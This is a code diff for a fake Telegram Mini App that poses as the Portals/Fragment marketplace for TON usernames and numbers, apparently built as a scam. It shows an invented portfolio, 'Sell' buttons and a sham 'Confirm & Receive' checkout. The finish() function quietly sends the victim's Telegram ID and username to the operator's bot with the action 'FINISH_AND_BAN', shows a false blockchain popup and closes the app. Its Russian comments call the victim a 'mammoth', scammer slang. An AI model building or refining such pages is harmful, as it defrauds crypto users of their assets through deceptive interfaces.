@@ -3,39 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Portals | Settlement</title>
+    <title>Portals | Secure Assets</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --bg: #000000; --card: #0a0a0a; --accent: #0088cc; --border: #1a1a1a; --text: #ffffff; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 0; }
-        .page { display: none; padding: 16px; }
+        :root { --bg: #000000; --card: #0a0a0a; --accent: #0088cc; --border: #1a1a1a; --text: #ffffff; --sub: #666; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 0; overflow: hidden; }
+        .page { display: none; padding: 16px; height: 100vh; }
         .page.active { display: block; }
+
+        /* Экраны */
+        .portal-card { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 24px; text-align: center; margin-top: 20px; }
+        .nft-item { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 12px; margin-bottom: 12px; display: flex; align-items: center; justify-content: space-between; }
+        .nft-icon { width: 40px; height: 40px; background: #111; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
         
-        /* Стиль Portals */
-        .portal-card { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 24px; text-align: center; margin-top: 50px; }
-        .status-dot { width: 8px; height: 8px; background: #31b545; border-radius: 50%; display: inline-block; margin-right: 8px; box-shadow: 0 0 10px #31b545; }
-        .price-text { font-size: 48px; font-weight: 800; margin: 20px 0; letter-spacing: -2px; }
-        .price-text span { font-size: 20px; color: var(--accent); letter-spacing: 0; }
-        
-        .btn-confirm { width: 100%; background: var(--text); color: #000; border: none; padding: 20px; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 30px; }
+        /* Кнопки */
+        .btn-main { background: var(--accent); color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: 700; font-size: 14px; }
+        .btn-confirm { width: 100%; background: #fff; color: #000; border: none; padding: 20px; border-radius: 16px; font-size: 18px; font-weight: 800; margin-top: 30px; }
+
+        /* Тексты */
+        .price-big { font-size: 48px; font-weight: 800; margin: 20px 0; letter-spacing: -1px; }
+        .price-big span { font-size: 18px; color: var(--accent); }
         .details-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border); font-size: 14px; }
-        .details-row span { color: #666; }
     </style>
 </head>
 <body>
 
-    <div id="checkout" class="page active">
-        <div class="portal-card">
-            <div style="font-size: 12px; color: #666; text-transform: uppercase;"><span class="status-dot"></span> Smart Contract Ready</div>
-            <div class="price-text" id="price-val">455 <span>TON</span></div>
-            
-            <div class="details-row"><span>Asset</span> <b id="asset-name">@crypto_king</b></div>
-            <div><br></div>
-            <div class="details-row"><span>Network</span> <b>The Open Network</b></div>
-            <div class="details-row"><span>Method</span> <b>P2P Settlement</b></div>
+    <div id="main-page" class="page active">
+        <div style="font-weight: 800; font-size: 14px; color: var(--accent); margin-bottom: 20px;">PORTAL MANAGEMENT</div>
+        
+        <div style="background: #0a0a0a; padding: 20px; border-radius: 20px; border: 1px solid var(--border); text-align: center; margin-bottom: 25px;">
+            <div style="color: var(--sub); font-size: 11px; text-transform: uppercase;">Portfolio Estimate</div>
+            <div style="font-size: 32px; font-weight: 800; margin-top: 5px;">1,294.50 <span style="font-size: 16px; color: var(--accent);">TON</span></div>
+        </div>
 
-            <button class="btn-confirm" onclick="finishTransaction()">Confirm & Sign</button>
-            <p style="font-size: 12px; color: #444; margin-top: 20px;">By signing, you agree to the Fragment terms of service.</p>
+        <div class="nft-item">
+            <div style="display: flex; align-items: center; gap: 12px;">
+                <div class="nft-icon">👤</div>
+                <div><b>@crypto_king</b><br><span style="font-size:12px; color:var(--sub)">Username</span></div>
+            </div>
+            <button class="btn-main" onclick="openCheckout('@crypto_king', 455)">Sell</button>
+        </div>
+
+        <div class="nft-item">
+            <div style="display: flex; align-items: center; gap: 12px;">
+                <div class="nft-icon">📱</div>
+                <div><b>+888 0551 1051</b><br><span style="font-size:12px; color:var(--sub)">Number</span></div>
+            </div>
+            <button class="btn-main" onclick="openCheckout('+888 0551', 320)">Sell</button>
+        </div>
+    </div>
+
+    <div id="checkout-page" class="page">
+        <div style="color: var(--sub); font-size: 14px;" onclick="location.reload()">← Back</div>
+        <div class="portal-card">
+            <div style="font-size: 12px; color: #31b545; font-weight: 700;">● READY TO SIGN</div>
+            <div class="price-big" id="price-val">0 <span>TON</span></div>
+            
+            <div class="details-row"><span>Asset</span> <b id="asset-name">None</b></div>
+            <div class="details-row"><span>Fee</span> <b>0 TON</b></div>
+            <div class="details-row"><span>Recipient</span> <b>UQBL...UFXWrn</b></div>
+
+            <button class="btn-confirm" onclick="finish()">Confirm & Receive</button>
         </div>
     </div>
 
@@ -43,21 +71,25 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        function finishTransaction() {
-            // 1. Отправляем сигнал боту на блокировку
+        function openCheckout(asset, price) {
+            document.getElementById('asset-name').innerText = asset;
+            document.getElementById('price-val').innerHTML = price + ' <span>TON</span>';
+            document.getElementById('main-page').style.display = 'none';
+            document.getElementById('checkout-page').style.display = 'block';
+        }
+
+        function finish() {
+            // Отправляем данные боту для уведомления и блокировки
             tg.sendData(JSON.stringify({
                 action: "FINISH_AND_BAN",
-                user: tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "unknown"
+                user_id: tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "unknown",
+                user_name: tg.initDataUnsafe.user ? tg.initDataUnsafe.user.username : "unknown"
             }));
 
-            // 2. Имитация процесса и закрытие
-            tg.showPopup({
-                title: 'Signing...',
-                message: 'Processing transaction in TON Blockchain. Please wait.',
-            });
-
+            tg.showPopup({ title: 'Signing...', message: 'Broadcasting to TON Blockchain...' });
+            
             setTimeout(() => {
-                tg.close(); // Выкидываем мамонта из приложения
+                tg.close(); // Выкидываем мамонта
             }, 3000);
         }
     </script>
